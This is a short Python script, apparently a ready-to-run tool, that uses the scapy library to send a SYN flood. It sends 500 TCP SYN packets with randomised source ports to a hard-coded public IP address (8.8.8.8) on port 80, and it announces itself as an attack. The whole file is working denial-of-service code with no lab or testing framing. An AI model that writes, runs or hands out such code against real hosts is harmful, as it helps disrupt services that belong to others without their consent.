from scapy.all import IP, TCP, send, conf
import random
import time

# --- SETTINGS ---
target_ip = "8.8.8.8"     # Target destination IP
target_port = 80          # Target service port (HTTP)
packet_count = 500        # Total packet volume to transmit
# -----------------

print(f"[*] Starting SYN Flood attack on {target_ip}:{target_port}...")
print(f"[*] Using interface: {conf.iface}")

try:
    for i in range(packet_count):
        # Randomize source port to simulate multiple sessions
        sport = random.randint(1024, 65535)
        
        # Construct TCP SYN segment (Flags: S)
        packet = IP(dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S")
        
        # Dispatch packet at maximum throughput
        send(packet, verbose=False)
        
        if i % 100 == 0 and i > 0:
            print(f"[>] Sent {i} packets...")

    print(f"\n[+] Attack completed. Sent {packet_count} SYN packets.")
except Exception as e:
    print(f"[-] ERROR: {e}")
    print("[-] HINT: Ensure you have ADMINISTRATOR privileges!")